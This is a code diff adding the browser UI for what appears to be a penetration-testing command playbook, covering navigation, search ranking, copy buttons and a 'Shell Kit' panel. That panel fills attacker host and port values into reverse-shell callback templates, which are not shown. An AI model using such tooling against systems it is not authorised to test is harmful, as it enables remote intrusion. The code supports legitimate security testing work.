+
+            const moduleButton = document.createElement("button");
+            moduleButton.type = "button";
+            moduleButton.className = "module-item";
+            if (isModuleActive) {
+                moduleButton.classList.add("active");
+            }
+            if (isModuleOpen) {
+                moduleButton.classList.add("open");
+            }
+            moduleButton.title = moduleName;
+            moduleButton.innerHTML = `
+                <span class="module-item-main">
+                    <span class="module-item-topline">
+                        <span class="module-arrow material-symbols-outlined">expand_more</span>
+                        <span class="module-item-title">${escapeHtml(moduleName)}</span>
+                    </span>
+                </span>
+                <span class="module-count">${tools.length}</span>
+            `;
+            moduleButton.onclick = () => {
+                if (isModuleActive) {
+                    toggleModuleExpansion(pathName, moduleName);
+                    return;
+                }
+
+                expandSidebarTo(pathName, moduleName);
+                loadView(pathName, moduleName, null, "");
+            };
+
+            const toolList = document.createElement("div");
+            toolList.className = "tool-list";
+            if (isModuleOpen) {
+                toolList.classList.add("open");
+            }
+
+            tools.forEach(toolName => {
+                const toolItem = document.createElement("button");
+                toolItem.type = "button";
+                toolItem.className = "tool-item";
+                if (isActiveToolLocation(pathName, moduleName, toolName)) {
+                    toolItem.classList.add("active");
+                }
+                toolItem.title = toolName;
+                toolItem.innerHTML = `
+                    <span>${escapeHtml(toolName)}</span>
+                    ${moduleData.tools[toolName] > 1 ? `<span class="tool-count">${moduleData.tools[toolName]}</span>` : ""}
+                `;
+                toolItem.onclick = () => {
+                    expandSidebarTo(pathName, moduleName);
+                    loadToolView(toolName, pathName, moduleName);
+                };
+                toolList.appendChild(toolItem);
+            });
+
+            moduleNode.appendChild(moduleButton);
+            moduleNode.appendChild(toolList);
+            moduleList.appendChild(moduleNode);
+        });
+
+        navPath.appendChild(pathHeader);
+        navPath.appendChild(moduleList);
+        categoryListDiv.appendChild(navPath);
+    });
+}
+
+function getPopularTools(limit = 8) {
+    return Array.from(toolManualByName.values())
+        .filter(manual => (manual.items || []).length > 0)
+        .sort((a, b) => {
+            if (b.items.length !== a.items.length) {
+                return b.items.length - a.items.length;
+            }
+            if (b.workflows.length !== a.workflows.length) {
+                return b.workflows.length - a.workflows.length;
+            }
+            return a.name.localeCompare(b.name);
+        })
+        .slice(0, limit);
+}
+
+function renderSidebarMetrics() {
+    if (!sidebarMetrics) {
+        return;
+    }
+
+    const toolCount = new Set(db.map(item => item.tool)).size;
+    sidebarMetrics.innerHTML = `
+        <div class="sidebar-metric-card">
+            <span class="sidebar-metric-label">Inventory</span>
+            <div class="sidebar-metric-row">
+                <span class="sidebar-metric-value">${toolCount}</span>
+                <span class="sidebar-metric-copy">tools indexed</span>
+            </div>
+        </div>
+    `;
+}
+
+function renderHomeDashboard() {
+    heroTitle.textContent = appMeta.title || "IO Playbook";
+    heroSubtitle.textContent = appMeta.subtitle || "";
+    heroDisclaimer.textContent = appMeta.disclaimer || "";
+
+    const popularTools = getPopularTools();
+    renderSidebarMetrics();
+    if (popularToolsMeta) {
+        popularToolsMeta.textContent = `Top ${popularTools.length}`;
+    }
+
+    if (popularToolsGrid) {
+        popularToolsGrid.innerHTML = "";
+        popularTools.forEach(toolManual => {
+            const button = document.createElement("button");
+            button.type = "button";
+            button.className = "popular-tool-btn";
+            button.innerHTML = `
+                <span class="popular-tool-head">
+                    <span class="tool-pill">${escapeHtml(toolManual.name)}</span>
+                    <span class="popular-tool-count">${pluralize(toolManual.items.length, "entry")}</span>
+                </span>
+                <span class="popular-tool-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</span>
+                <span class="popular-tool-meta">${escapeHtml(`${pluralize(toolManual.workflows.length, "workflow")} • ${(toolManual.platforms || []).slice(0, 2).join(" • ") || "Mixed use"}`)}</span>
+            `;
+            button.onclick = () => {
+                loadToolView(toolManual.name);
+            };
+            popularToolsGrid.appendChild(button);
+        });
+    }
+
+    shortcutGrid.innerHTML = "";
+    (appMeta.quickstart || []).forEach(shortcut => {
+        const button = document.createElement("button");
+        button.type = "button";
+        button.className = "shortcut-btn";
+        button.innerHTML = `
+            <span class="shortcut-label">${escapeHtml(shortcut.label)}</span>
+            <span class="shortcut-query">${escapeHtml(shortcut.module || shortcut.query || "")}</span>
+        `;
+        button.onclick = () => {
+            if (shortcut.module) {
+                const moduleMeta = getModuleMeta(shortcut.module);
+                loadView(moduleMeta.path || null, shortcut.module, null, "");
+                return;
+            }
+            executeSearch(shortcut.query || "");
+        };
+        shortcutGrid.appendChild(button);
+    });
+
+    principlesList.innerHTML = (appMeta.principles || [])
+        .map(principle => `<li>${escapeHtml(principle)}</li>`)
+        .join("");
+}
+
+function setResultsMeta(text) {
+    resultsMeta.textContent = text;
+}
+
+function setClearSearchState(active) {
+    clearSearchBtn.disabled = !active;
+}
+
+function renderEmptyState(message) {
+    payloadContainer.innerHTML = `
+        <div class="empty-state">
+            <h3>No matching playbook entries</h3>
+            <p>${escapeHtml(message)}</p>
+        </div>
+    `;
+}
+
+function scoreSearchMatch(item, normalizedQuery, tokens, requireAllTokens = true, allowFuzzy = false) {
+    const tokenMatches = tokens.map(token => ({
+        command: getTermMatchStrength(token, item._commandTerms, allowFuzzy),
+        title: getTermMatchStrength(token, item._titleTerms, allowFuzzy),
+        module: getTermMatchStrength(token, item._moduleTerms, allowFuzzy),
+        tool: getTermMatchStrength(token, item._toolTerms, allowFuzzy),
+        path: getTermMatchStrength(token, item._pathTerms, allowFuzzy),
+        summary: getTermMatchStrength(token, item._moduleSummaryTerms, allowFuzzy),
+        description: getTermMatchStrength(token, item._descriptionTerms, allowFuzzy),
+        tags: getTermMatchStrength(token, item._tagTerms, allowFuzzy)
+    }));
+    const matchingTokens = tokenMatches.filter(match => Math.max(...Object.values(match)) > 0);
+
+    if (requireAllTokens && matchingTokens.length !== tokens.length) {
+        return -1;
+    }
+
+    if (!requireAllTokens && matchingTokens.length === 0) {
+        return -1;
+    }
+
+    let score = matchingTokens.length * 12;
+
+    if (item._searchCommand === normalizedQuery) {
+        score += 220;
+    }
+
+    if (item._searchTitle === normalizedQuery) {
+        score += 170;
+    }
+
+    if (item._searchModule === normalizedQuery) {
+        score += 150;
+    }
+
+    if (item._searchTool === normalizedQuery) {
+        score += 135;
+    }
+
+    if (item._searchPath === normalizedQuery) {
+        score += 120;
+    }
+
+    if (normalizedQuery && item._searchCommand.includes(normalizedQuery)) {
+        score += 145;
+    }
+
+    if (normalizedQuery && item._searchTitle.includes(normalizedQuery)) {
+        score += 120;
+    }
+
+    if (normalizedQuery && item._searchModule.includes(normalizedQuery)) {
+        score += 110;
+    }
+
+    if (normalizedQuery && item._searchTool.includes(normalizedQuery)) {
+        score += 95;
+    }
+
+    if (normalizedQuery && item._searchPath.includes(normalizedQuery)) {
+        score += 65;
+    }
+
+    if (normalizedQuery && item._searchModuleSummary.includes(normalizedQuery)) {
+        score += 30;
+    }
+
+    matchingTokens.forEach(match => {
+        score += match.command * 22;
+        score += match.title * 18;
+        score += match.module * 16;
+        score += match.tool * 14;
+        score += match.path * 11;
+        score += match.summary * 10;
+        score += match.description * 8;
+        score += match.tags * 10;
+    });
+
+    return score;
+}
+
+function getSearchResults(query) {
+    const normalizedQuery = normalizeText(query);
+    const tokens = normalizedQuery.split(/\s+/).filter(Boolean);
+
+    if (tokens.length === 0) {
+        return {
+            items: [],
+            broad: false
+        };
+    }
+
+    const buildMatches = requireAllTokens => {
+        return db
+            .map(item => {
+                const score = scoreSearchMatch(item, normalizedQuery, tokens, requireAllTokens, false);
+                if (score < 0) {
+                    return null;
+                }
+                item._score = score;
+                return item;
+            })
+            .filter(Boolean)
+            .sort((a, b) => {
+                if (b._score !== a._score) {
+                    return b._score - a._score;
+                }
+                return a.title.localeCompare(b.title);
+            });
+    };
+
+    const strictMatches = buildMatches(true);
+    if (strictMatches.length > 0) {
+        return {
+            items: strictMatches,
+            broad: false,
+            fuzzy: false
+        };
+    }
+
+    const fuzzyStrictMatches = db
+        .map(item => {
+            const score = scoreSearchMatch(item, normalizedQuery, tokens, true, true);
+            if (score < 0) {
+                return null;
+            }
+            item._score = score;
+            return item;
+        })
+        .filter(Boolean)
+        .sort((a, b) => {
+            if (b._score !== a._score) {
+                return b._score - a._score;
+            }
+            return a.title.localeCompare(b.title);
+        });
+
+    if (fuzzyStrictMatches.length > 0) {
+        return {
+            items: fuzzyStrictMatches,
+            broad: false,
+            fuzzy: true
+        };
+    }
+
+    return {
+        items: db
+            .map(item => {
+                const score = scoreSearchMatch(item, normalizedQuery, tokens, false, true);
+                if (score < 0) {
+                    return null;
+                }
+                item._score = score;
+                return item;
+            })
+            .filter(Boolean)
+            .sort((a, b) => {
+                if (b._score !== a._score) {
+                    return b._score - a._score;
+                }
+                return a.title.localeCompare(b.title);
+            }),
+        broad: true,
+        fuzzy: true
+    };
+}
+
+function scoreToolMatch(toolManual, normalizedQuery, tokens, requireAllTokens = true, allowFuzzy = false) {
+    const tokenMatches = tokens.map(token => ({
+        name: getTermMatchStrength(token, toolManual._nameTerms || [], allowFuzzy),
+        summary: getTermMatchStrength(token, toolManual._summaryTerms || [], allowFuzzy),
+        any: getTermMatchStrength(token, toolManual._searchTerms || [], allowFuzzy)
+    }));
+    const matchingTokens = tokenMatches.filter(match => Math.max(...Object.values(match)) > 0);
+
+    if (requireAllTokens && matchingTokens.length !== tokens.length) {
+        return -1;
+    }
+
+    if (!requireAllTokens && matchingTokens.length === 0) {
+        return -1;
+    }
+
+    const normalizedName = normalizeText(toolManual.name);
+    let score = matchingTokens.length * 14;
+
+    if (normalizedName === normalizedQuery) {
+        score += 280;
+    }
+
+    if (normalizedQuery && normalizedName.includes(normalizedQuery)) {
+        score += 160;
+    }
+
+    matchingTokens.forEach(match => {
+        score += match.name * 28;
+        score += match.summary * 12;
+        score += match.any * 8;
+    });
+
+    score += (toolManual.reference_items || []).length;
+
+    return score;
+}
+
+function getToolSearchResults(query) {
+    const normalizedQuery = normalizeText(query);
+    const tokens = normalizedQuery.split(/\s+/).filter(Boolean);
+
+    if (tokens.length === 0) {
+        return {
+            items: [],
+            broad: false
+        };
+    }
+
+    const manuals = Array.from(toolManualByName.values());
+    const buildMatches = requireAllTokens => {
+        return manuals
+            .map(toolManual => {
+                const score = scoreToolMatch(toolManual, normalizedQuery, tokens, requireAllTokens, false);
+                if (score < 0) {
+                    return null;
+                }
+                return {
+                    ...toolManual,
+                    _score: score
+                };
+            })
+            .filter(Boolean)
+            .sort((a, b) => {
+                if (b._score !== a._score) {
+                    return b._score - a._score;
+                }
+                return a.name.localeCompare(b.name);
+            });
+    };
+
+    const strictMatches = buildMatches(true);
+    if (strictMatches.length > 0) {
+        return {
+            items: strictMatches,
+            broad: false,
+            fuzzy: false
+        };
+    }
+
+    const fuzzyStrictMatches = manuals
+        .map(toolManual => {
+            const score = scoreToolMatch(toolManual, normalizedQuery, tokens, true, true);
+            if (score < 0) {
+                return null;
+            }
+            return {
+                ...toolManual,
+                _score: score
+            };
+        })
+        .filter(Boolean)
+        .sort((a, b) => {
+            if (b._score !== a._score) {
+                return b._score - a._score;
+            }
+            return a.name.localeCompare(b.name);
+        });
+
+    if (fuzzyStrictMatches.length > 0) {
+        return {
+            items: fuzzyStrictMatches,
+            broad: false,
+            fuzzy: true
+        };
+    }
+
+    return {
+        items: manuals
+            .map(toolManual => {
+                const score = scoreToolMatch(toolManual, normalizedQuery, tokens, false, true);
+                if (score < 0) {
+                    return null;
+                }
+                return {
+                    ...toolManual,
+                    _score: score
+                };
+            })
+            .filter(Boolean)
+            .sort((a, b) => {
+                if (b._score !== a._score) {
+                    return b._score - a._score;
+                }
+                return a.name.localeCompare(b.name);
+            }),
+        broad: true,
+        fuzzy: true
+    };
+}
+
+function sortItemsForView(items, options = {}) {
+    const { query = "" } = options;
+
+    return [...items].sort((a, b) => {
+        if (query) {
+            if (b._score !== a._score) {
+                return b._score - a._score;
+            }
+        } else {
+            const pathCompare = getPathRank(a.path) - getPathRank(b.path);
+            if (pathCompare !== 0) {
+                return pathCompare;
+            }
+
+            const moduleCompare = getModuleRank(a.module) - getModuleRank(b.module);
+            if (moduleCompare !== 0) {
+                return moduleCompare;
+            }
+
+            const toolCompare = a.tool.localeCompare(b.tool);
+            if (toolCompare !== 0) {
+                return toolCompare;
+            }
+        }
+
+        return a.title.localeCompare(b.title);
+    });
+}
+
+function getTopFlags(items, limit = 5) {
+    const flagCounts = new Map();
+
+    items.forEach(item => {
+        (item.flags || []).forEach(flag => {
+            flagCounts.set(flag, (flagCounts.get(flag) || 0) + 1);
+        });
+    });
+
+    return Array.from(flagCounts.entries())
+        .sort((a, b) => {
+            if (b[1] !== a[1]) {
+                return b[1] - a[1];
+            }
+            return a[0].localeCompare(b[0]);
+        })
+        .slice(0, limit)
+        .map(([flag]) => flag);
+}
+
+function getPlatforms(items) {
+    return Array.from(new Set(items.map(item => item.platform).filter(Boolean)));
+}
+
+function getToolUseCases(items, limit = 3) {
+    return Array.from(new Set(items.map(item => item.title).filter(Boolean))).slice(0, limit);
+}
+
+function buildToolSummary(toolName, items) {
+    if (items.length === 0) {
+        return `${toolName} quick guide.`;
+    }
+
+    if (items.length === 1) {
+        return items[0].description || `${toolName} quick guide.`;
+    }
+
+    const useCases = getToolUseCases(items, 3);
+    if (useCases.length === 0) {
+        return items[0].description || `${toolName} quick guide.`;
+    }
+
+    return `Saved workflows: ${useCases.join(" • ")}`;
+}
+
+function encodeInlineValue(value) {
+    return encodeURIComponent(String(value || ""));
+}
+
+function buildDisplayGroups(items) {
+    const pathMap = new Map();
+
+    items.forEach(item => {
+        if (!pathMap.has(item.path)) {
+            pathMap.set(item.path, {
+                name: item.path,
+                items: [],
+                modules: new Map()
+            });
+        }
+
+        const pathGroup = pathMap.get(item.path);
+        pathGroup.items.push(item);
+
+        if (!pathGroup.modules.has(item.module)) {
+            pathGroup.modules.set(item.module, {
+                name: item.module,
+                path: item.path,
+                items: [],
+                tools: new Map()
+            });
+        }
+
+        const moduleGroup = pathGroup.modules.get(item.module);
+        moduleGroup.items.push(item);
+
+        if (!moduleGroup.tools.has(item.tool)) {
+            moduleGroup.tools.set(item.tool, {
+                name: item.tool,
+                items: []
+            });
+        }
+
+        moduleGroup.tools.get(item.tool).items.push(item);
+    });
+
+    return getOrderedPaths(Array.from(pathMap.keys())).map(pathName => {
+        const pathGroup = pathMap.get(pathName);
+        const moduleNames = Array.from(pathGroup.modules.keys());
+
+        return {
+            name: pathName,
+            items: pathGroup.items,
+            meta: getPathMeta(pathName),
+            modules: getOrderedModules(pathName, moduleNames).map(moduleName => {
+                const moduleGroup = pathGroup.modules.get(moduleName);
+                const toolGroups = Array.from(moduleGroup.tools.values())
+                    .sort((a, b) => a.name.localeCompare(b.name))
+                    .map(toolGroup => ({
+                        ...toolGroup,
+                        items: sortItemsForView(toolGroup.items, { query: activeView.query }),
+                        platforms: getPlatforms(toolGroup.items),
+                        topFlags: getTopFlags(toolGroup.items, 4),
+                        profile: getToolProfile(toolGroup.name)
+                    }));
+
+                return {
+                    ...moduleGroup,
+                    tools: toolGroups,
+                    meta: getModuleMeta(moduleName)
+                };
+            })
+        };
+    });
+}
+
+function getShellHelperValues() {
+    const hostInput = document.getElementById("shell-helper-host");
+    const portInput = document.getElementById("shell-helper-port");
+
+    return {
+        host: hostInput?.value.trim() || shellHelperDefaults.host,
+        port: portInput?.value.trim() || shellHelperDefaults.port
+    };
+}
+
+function renderShellHelperTemplate(template) {
+    const { host, port } = getShellHelperValues();
+
+    return String(template)
+        .replaceAll("{{HOST}}", host)
+        .replaceAll("{{PORT}}", port);
+}
+
+function setCopyButtonState(button, label, isCopied = false) {
+    if (!button) {
+        return;
+    }
+
+    const defaultLabel = button.dataset.copyLabel || button.innerText.trim() || "Copy";
+    button.dataset.copyLabel = defaultLabel;
+
+    if (button._copyResetTimer) {
+        window.clearTimeout(button._copyResetTimer);
+    }
+
+    button.innerText = label;
+    button.classList.toggle("is-copied", isCopied);
+    button.classList.toggle("is-failed", !isCopied);
+
+    button._copyResetTimer = window.setTimeout(() => {
+        button.innerText = defaultLabel;
+        button.classList.remove("is-copied", "is-failed");
+    }, 1200);
+}
+
+async function writeTextToClipboard(text) {
+    const value = String(text || "");
+
+    if (!value) {
+        return false;
+    }
+
+    if (navigator.clipboard?.writeText && window.isSecureContext) {
+        try {
+            await navigator.clipboard.writeText(value);
+            return true;
+        } catch (error) {
+            // Fall through to the textarea copy path when the modern API is blocked.
+        }
+    }
+
+    const textArea = document.createElement("textarea");
+    textArea.value = value;
+    textArea.setAttribute("readonly", "");
+    textArea.style.position = "fixed";
+    textArea.style.top = "0";
+    textArea.style.left = "-9999px";
+    textArea.style.opacity = "0";
+    textArea.style.pointerEvents = "none";
+
+    const previousActiveElement = document.activeElement;
+    const selection = document.getSelection();
+    const previousRange = selection && selection.rangeCount > 0
+        ? selection.getRangeAt(0)
+        : null;
+
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    textArea.setSelectionRange(0, textArea.value.length);
+
+    let copied = false;
+
+    try {
+        copied = document.execCommand("copy");
+    } catch (error) {
+        copied = false;
+    }
+
+    document.body.removeChild(textArea);
+
+    if (selection) {
+        selection.removeAllRanges();
+        if (previousRange) {
+            selection.addRange(previousRange);
+        }
+    }
+
+    if (previousActiveElement instanceof HTMLElement) {
+        previousActiveElement.focus();
+    }
+
+    return copied;
+}
+
+async function copyInlineText(text, button) {
+    const didCopy = await writeTextToClipboard(text);
+    setCopyButtonState(button, didCopy ? "Copied" : "Failed", didCopy);
+}
+
+function getShellHelperCard(sectionIndex, cardIndex) {
+    return shellHelperSections[sectionIndex]?.cards?.[cardIndex] || null;
+}
+
+function copyShellHelperCommand(sectionIndex, cardIndex, button) {
+    const card = getShellHelperCard(sectionIndex, cardIndex);
+    if (!card) {
+        return;
+    }
+
+    copyInlineText(renderShellHelperTemplate(card.template), button);
+}
+
+function updateShellHelper() {
+    shellHelperSections.forEach((section, sectionIndex) => {
+        section.cards.forEach((card, cardIndex) => {
+            const codeNode = document.getElementById(`shell-helper-code-${sectionIndex}-${cardIndex}`);
+            if (codeNode) {
+                codeNode.textContent = renderShellHelperTemplate(card.template);
+            }
+        });
+    });
+}
+
+function buildShellHelperMarkup() {
+    const fileTransferPath = encodeInlineValue("Post-Exploitation & Escalation");
+    const fileTransferModule = encodeInlineValue("File Transfer & Tool Staging");
+
+    return `
+        <section class="shell-helper">
+            <div class="shell-helper-head">
+                <div class="shell-helper-copy">
+                    <span class="section-kicker">Shell Kit</span>
+                    <h3 class="shell-helper-title">Listener, callback, and TTY helper</h3>
+                    <p class="section-subcopy">Keep a compact shell workflow on-page here, then jump to the wider external generator only when you need more callback coverage.</p>
+                </div>
+                <div class="tool-actions">
+                    <a class="doc-link doc-pill" href="https://www.revshells.com/" target="_blank" rel="noreferrer">Open revshells.com</a>
+                </div>
+            </div>
+            <div class="shell-helper-controls">
+                <label class="shell-helper-field">
+                    <span class="manual-inline-label">LHOST</span>
+                    <input
+                        id="shell-helper-host"
+                        class="shell-helper-input"
+                        type="text"
+                        value="${escapeHtml(shellHelperDefaults.host)}"
+                        placeholder="${escapeHtml(shellHelperDefaults.host)}"
+                        oninput="updateShellHelper()"
+                    >
+                </label>
+                <label class="shell-helper-field">
+                    <span class="manual-inline-label">LPORT</span>
+                    <input
+                        id="shell-helper-port"
+                        class="shell-helper-input"
+                        type="text"
+                        inputmode="numeric"
+                        value="${escapeHtml(shellHelperDefaults.port)}"
+                        placeholder="${escapeHtml(shellHelperDefaults.port)}"
+                        oninput="updateShellHelper()"
+                    >
+                </label>
+            </div>
+            <div class="shell-helper-stack">
+                ${shellHelperSections.map((section, sectionIndex) => `
+                    <section class="shell-helper-section">
+                        <div class="shell-helper-section-head">
+                            <div>
+                                <span class="section-kicker">${escapeHtml(section.kicker)}</span>
+                                <h4 class="shell-helper-section-title">${escapeHtml(section.title)}</h4>
+                                <p class="section-subcopy">${escapeHtml(section.description)}</p>
+                            </div>
+                        </div>
+                        <div class="shell-helper-grid">
+                            ${section.cards.map((card, cardIndex) => `
+                                <article class="shell-helper-card">
+                                    <div class="shell-helper-card-head">
+                                        <span class="entry-kind-badge">${escapeHtml(card.label)}</span>
+                                        <h4 class="shell-helper-card-title">${escapeHtml(card.title)}</h4>
+                                    </div>
+                                    <p class="command-description">${escapeHtml(card.description)}</p>
+                                    ${buildCodeShellMarkup(
+                                        `<code id="shell-helper-code-${sectionIndex}-${cardIndex}">${escapeHtml(renderShellHelperTemplate(card.template))}</code>`,
+                                        `onclick="copyShellHelperCommand(${sectionIndex}, ${cardIndex}, this)"`,
+                                        "Template"
+                                    )}
+                                </article>
+                            `).join("")}
+                        </div>
+                    </section>
+                `).join("")}
+            </div>
+            <div class="shell-helper-support">
+                <article class="shell-helper-panel">
+                    <span class="section-kicker">Session Flow</span>
+                    <h4 class="shell-helper-section-title">Keep the session usable</h4>
+                    <ul class="shell-helper-list">
+                        ${shellHelperChecklist.map(item => `<li>${escapeHtml(item)}</li>`).join("")}
+                    </ul>
+                </article>
+                <article class="shell-helper-panel">
+                    <span class="section-kicker">Need More</span>
+                    <h4 class="shell-helper-section-title">Wider reference coverage</h4>
+                    <p class="section-subcopy">Use the external generator for broader callback combinations, and jump to the staging workflow when you need delivery and transfer helpers.</p>
+                    <div class="shell-helper-actions">
+                        <a class="doc-link doc-pill" href="https://www.revshells.com/" target="_blank" rel="noreferrer">External shell generator</a>
+                        <button
+                            class="secondary-btn inline-btn"
+                            type="button"
+                            onclick="loadView(decodeURIComponent('${fileTransferPath}'), decodeURIComponent('${fileTransferModule}'))"
+                        >
+                            Open file transfer workflow
+                        </button>
+                    </div>
+                </article>
+            </div>
+        </section>
+    `;
+}
+
+function buildModuleFeatureMarkup(moduleGroup) {
+    if (moduleGroup.name === "Shells & Payload Delivery" && activeView.type !== "tool") {
+        return buildShellHelperMarkup();
+    }
+
+    return "";
+}
+
+function buildModuleToolMarkup(meta = {}) {
+    return (meta.tools || [])
+        .slice(0, 6)
+        .map(tool => `<span class="module-tool-chip">${escapeHtml(tool)}</span>`)
+        .join("");
+}
+
+function buildCodeShellMarkup(codeMarkup, copyHandler, label = "Command") {
+    return `
+        <div class="code-shell">
+            <div class="code-shell-head">
+                <span class="code-shell-label">${escapeHtml(label)}</span>
+                <button class="copy-btn" type="button" ${copyHandler}>Copy</button>
+            </div>
+            <pre class="command-code">${codeMarkup}</pre>
+        </div>
+    `;
+}
+
+function buildWorkflowMarkup(text) {
+    const value = String(text || "").trim();
+    if (!value) {
+        return "";
+    }
+
+    const steps = value
+        .split(/\s*->\s*/)
+        .map(step => step.trim())
+        .filter(Boolean);
+
+    if (steps.length > 1) {
+        return `
+            <div class="workflow-panel">
+                <div class="workflow-panel-head">
+                    <span class="workflow-label">Workflow Path</span>
+                    <span class="workflow-chip">${pluralize(steps.length, "step")}</span>
+                </div>
+                <ol class="workflow-steps">
+                    ${steps.map((step, index) => `
+                        <li class="workflow-step">
+                            <span class="workflow-step-index">${index + 1}</span>
+                            <span class="workflow-step-copy">${escapeHtml(step)}</span>
+                        </li>
+                    `).join("")}
+                </ol>
+            </div>
+        `;
+    }
+
+    return `
+        <div class="workflow-panel">
+            <div class="workflow-panel-head">
+                <span class="workflow-label">Workflow Note</span>
+            </div>
+            <p class="workflow-note">${escapeHtml(value)}</p>
+        </div>
+    `;
+}
+
+function buildCommandMarkup(item, isOpen) {
+    const tagsMarkup = buildTagMarkup(item.tags || [], 7);
+    const hasTags = Boolean(tagsMarkup);
+    const hasTip = Boolean(item.tip);
+    const hasDescription = Boolean(item.description);
+    const hasCommandText = Boolean(String(item.command || "").trim());
+    const isWorkflow = isWorkflowEntry(item);
+    const hasPreview = hasCopyableCommand(item);
+    const hasWorkflowMarkup = hasCommandText && isWorkflow;
+    const hasPlatform = Boolean(item.platform);
+    const flagsMarkup = (item.flags || []).length > 0
+        ? `<div class="flags-row">${item.flags.map(flag => `<span class="flag-chip">${escapeHtml(flag)}</span>`).join("")}</div>`
+        : "";
+    const bestMatchMarkup = activeView.query && activeView.focusedId === item.entryId
+        ? `<span class="match-badge">Best match</span>`
+        : "";
+    const docMarkup = item.reference_url
+        ? `<a class="doc-link doc-pill" href="${escapeHtml(item.reference_url)}" target="_blank" rel="noreferrer">${escapeHtml(item.reference_label || "Docs")}</a>`
+        : "";
+    const hasNotes = Boolean(item.help_menu || item.tip || hasTags || flagsMarkup || item.reference_url);
+    const actionMarkup = `
+        ${hasNotes ? `<button class="secondary-btn inline-btn" type="button" onclick="openEntryNotes('${item.entryId}')">Notes</button>` : ""}
+        ${docMarkup}
+    `.trim();
+    const hasActions = Boolean(actionMarkup);
+    const toplineMarkup = hasTags || hasActions
+        ? `
+            <div class="command-topline">
+                ${hasTags ? `<div class="tag-row">${tagsMarkup}</div>` : ""}
+                ${hasActions ? `<div class="command-actions">${actionMarkup}</div>` : ""}
+            </div>
+        `
+        : "";
+
+    return `
+        <details class="command-item"${isOpen ? " open" : ""}>
+            <summary>
+                <div class="command-main">
+                    <div class="command-title-row">
+                        <span class="entry-kind-badge">${escapeHtml(item.type || "Entry")}</span>
+                        <span class="command-title">${escapeHtml(item.title)}</span>
+                        ${bestMatchMarkup}
+                    </div>
+                    ${hasDescription ? `<p class="command-description">${escapeHtml(item.description)}</p>` : ""}
+                    ${hasPreview ? `<code class="command-preview">${buildPreviewText(item.command)}</code>` : ""}
+                </div>
+                <div class="command-meta">
+                    ${hasPlatform ? `<span class="platform-badge">${escapeHtml(item.platform)}</span>` : ""}
+                    <span class="command-chevron material-symbols-outlined">expand_more</span>
+                </div>
+            </summary>
+            <div class="command-body">
+                ${toplineMarkup}
+                ${flagsMarkup}
+                ${hasPreview ? `
+                    ${buildCodeShellMarkup(
+                        `<code>${escapeHtml(item.command)}</code>`,
+                        `onclick="copyCommandById('${item.entryId}', this)"`,
+                        item.type === "Payload" ? "Payload" : "Command"
+                    )}
+                ` : ""}
+                ${hasWorkflowMarkup ? buildWorkflowMarkup(item.command) : ""}
+                ${hasTip ? `<p class="command-tip">${escapeHtml(item.tip)}</p>` : ""}
+            </div>
+        </details>
+    `;
+}
+
+function buildToolClusterMarkup(toolGroup, moduleGroup, pathGroup, toolIndex) {
+    const manual = getToolManual(toolGroup.name);
+    const platformMarkup = toolGroup.platforms
+        .map(platform => `<span class="platform-badge">${escapeHtml(platform)}</span>`)
+        .join("");
+    const referenceMarkup = (manual.reference_items || []).length > 0
+        ? manual.reference_items.slice(0, 4).map(item => `<span class="flag-chip">${escapeHtml(item.name)}</span>`).join("")
+        : "";
+    const guideToken = encodeInlineValue(toolGroup.name);
+    const manualMarkup = manual.manual_url
+        ? `
+            <a
+                class="doc-link doc-pill"
+                href="${escapeHtml(manual.manual_url)}"
+                target="_blank"
+                rel="noreferrer"
+            >
+                Manual
+            </a>
+        `
+        : "";
+    const hasAssistantCard = Boolean(manual.summary || manual.syntax || referenceMarkup || manualMarkup);
+    const isToolOpen = activeView.tool
+        ? isActiveToolLocation(pathGroup.name, moduleGroup.name, toolGroup.name)
+        : activeView.query
+            ? toolGroup.items.some(item => item.entryId === activeView.focusedId)
+            : false;
+
+    const commandsMarkup = toolGroup.items
+        .map((item, itemIndex) => {
+            const isOpen = activeView.focusedId === item.entryId
+                || (isActiveToolLocation(pathGroup.name, moduleGroup.name, toolGroup.name) && itemIndex === 0);
+            return buildCommandMarkup(item, isOpen);
+        })
+        .join("");
+
+    return `
+        <details class="tool-cluster"${isToolOpen ? " open" : ""}>
+            <summary class="tool-cluster-head">
+                <div class="tool-cluster-main">
+                    <div class="tool-cluster-topline">
+                        <span class="tool-pill">${escapeHtml(toolGroup.name)}</span>
+                        <span class="cluster-count">${pluralize(toolGroup.items.length, "entry")}</span>
+                        ${platformMarkup}
+                    </div>
+                </div>
+                <div class="tool-cluster-tail">
+                    <span class="tool-chevron material-symbols-outlined">expand_more</span>
+                </div>
+            </summary>
+            <div class="tool-cluster-body">
+                ${hasAssistantCard ? `
+                    <div class="tool-assistant-card">
+                        ${manual.summary ? `<p class="tool-summary">${escapeHtml(manual.summary || buildToolSummary(toolGroup.name, toolGroup.items))}</p>` : ""}
+                        ${manual.syntax ? `<code class="tool-syntax">${buildPreviewText(manual.syntax)}</code>` : ""}
+                        ${(referenceMarkup || manualMarkup) ? `
+                            <div class="tool-assistant-row">
+                                ${referenceMarkup ? `<div class="tool-flags">${referenceMarkup}</div>` : ""}
+                                <div class="tool-actions">
+                                    <button
+                                        class="secondary-btn inline-btn"
+                                        type="button"
+                                        onclick="loadToolView(decodeURIComponent('${guideToken}'))"
+                                    >
+                                        Open manual
+                                    </button>
+                                    ${manualMarkup}
+                                </div>
+                            </div>
+                        ` : `
+                            <div class="tool-actions">
+                                <button
+                                    class="secondary-btn inline-btn"
+                                    type="button"
+                                    onclick="loadToolView(decodeURIComponent('${guideToken}'))"
+                                >
+                                    Open manual
+                                </button>
+                            </div>
+                        `}
+                    </div>
+                ` : ""}
+                <div class="command-list">
+                    ${commandsMarkup}
+                </div>
+            </div>
+        </details>
+    `;
+}
+
+function buildModuleSectionMarkup(moduleGroup, pathGroup, moduleIndex) {
+    const meta = moduleGroup.meta || {};
+    const isModuleOpen = activeView.module
+        ? activeView.module === moduleGroup.name
+        : activeView.query
+            ? moduleGroup.items.some(item => item.entryId === activeView.focusedId)
+            : moduleIndex === 0;
+
+    const toolsMarkup = moduleGroup.tools
+        .map((toolGroup, toolIndex) => buildToolClusterMarkup(toolGroup, moduleGroup, pathGroup, toolIndex))
+        .join("");
+
+    return `
+        <details class="module-section"${isModuleOpen ? " open" : ""}>
+            <summary class="module-summary">
+                <div class="module-copy">
+                    <span class="module-kicker">Workflow</span>
+                    <h2 class="module-title">${escapeHtml(moduleGroup.name)}</h2>
